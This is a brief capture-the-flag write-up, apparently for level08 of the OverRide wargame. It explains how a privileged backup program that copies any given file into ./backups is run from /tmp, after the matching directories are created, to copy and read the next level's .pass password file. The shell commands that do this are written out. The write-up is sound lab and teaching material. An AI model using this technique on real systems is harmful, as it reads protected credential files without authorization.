Here the program take as parameter a path to a file.
Then it will simply copies every char of this file into a new files created in ./backups

So here what we're going to do is simply give it the path of the .pass file of the next level.

We go to /tmp because we have read and write rights.
We create a folder backups/home/users/level09 because we will give it /home/users/level09/.pass as parameters
If the directories are not created before it will throw an error.
This is because the open function create the file .pass but don't create in between directories (backups -> .pass)
Then we run the program from the /tmp directory.

level08@OverRide:~$ cd /tmp
level08@OverRide:/tmp$ mkdir -p backups/home/users/level09
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
